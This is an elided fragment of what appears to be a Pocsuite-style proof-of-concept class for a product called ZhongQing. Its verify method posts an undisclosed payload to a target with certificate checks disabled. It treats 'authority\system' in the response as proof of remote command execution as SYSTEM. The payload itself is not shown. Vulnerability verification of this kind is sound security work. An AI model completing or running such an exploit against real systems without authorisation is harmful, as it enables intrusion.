...
class ZhongQingPOC(POCBase):
    ...
    def _verify(self):
        ...
        try:
            ...
            resq = requests.post(url=url,data=payload,headers=headers,verify=False)
            
            if 'authority\system' in resq.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['echo'] = resq.text
